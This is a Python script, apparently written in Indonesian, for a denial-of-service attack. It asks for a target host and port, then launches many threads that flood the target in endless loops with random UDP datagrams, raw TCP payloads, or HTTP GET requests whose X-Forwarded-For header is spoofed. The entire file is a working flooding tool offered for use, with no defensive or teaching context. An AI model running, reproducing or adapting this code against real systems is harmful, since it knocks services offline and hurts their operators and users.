import socket
import threading
import random
import time
import os

# Warna terminal
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
c = '\033[36m'
w = '\033[0m'

# Banner
os.system("clear")
print(f"""{r}
██████╗ ██████╗  ██████╗ ███████╗     ██████╗  █████╗ ███╗   ██╗ █████╗ ███╗   ██╗ █████╗ ███╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔════╝ ██╔══██╗████╗  ██║██╔══██╗████╗  ██║██╔══██╗████╗  ██║
██║  ██║██████╔╝██║   ██║███████╗    ██║  ███╗███████║██╔██╗ ██║███████║██╔██╗ ██║███████║██╔██╗ ██║
██║  ██║██╔═══╝ ██║   ██║╚════██║    ██║   ██║██╔══██║██║╚██╗██║██╔══██║██║╚██╗██║██╔══██║██║╚██╗██║
██████╔╝██║     ╚██████╔╝███████║    ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██║ ╚████║██║  ██║██║ ╚████║
╚═════╝ ╚═╝      ╚═════╝ ╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝
           {w}Tools DDoS Gabungan by {y}al_cyber{w}
""")

# Input target
ip = input(f"{c}[?] Target IP/Host: {w}")
port = int(input(f"{c}[?] Target Port: {w}"))
method = input(f"{c}[?] Method (udp/tcp/http): {w}").lower()
times = int(input(f"{c}[?] Packets per thread: {w}"))
threads = int(input(f"{c}[?] Threads: {w}"))

def udp():
    data = random._urandom(1180)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for _ in range(times):
                s.sendto(data, addr)
            print(f"{g}[UDP] Menyerang {ip}:{port} dengan {times} paket")
        except Exception as e:
            print(f"{r}[UDP] Error: {e}")

def tcp():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for _ in range(times):
                s.send(data)
            print(f"{y}[TCP] Menyerang {ip}:{port} dengan {times} paket")
            s.close()
        except Exception as e:
            print(f"{r}[TCP] Error: {e}")

def http():
    fake_ip = "182.21.20." + str(random.randint(1, 254))
    request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nX-Forwarded-For: {fake_ip}\r\n\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(request.encode())
            print(f"{c}[HTTP] Request dikirim ke {ip}:{port}")
            s.close()
        except Exception as e:
            print(f"{r}[HTTP] Error: {e}")

# Pilih metode
attack_func = {"udp": udp, "tcp": tcp, "http": http}.get(method)

if attack_func is None:
    print(f"{r}Metode salah! Pilih antara udp, tcp, atau http.")
    exit()

# Jalankan serangan
for i in range(threads):
    th = threading.Thread(target=attack_func)
    th.start()
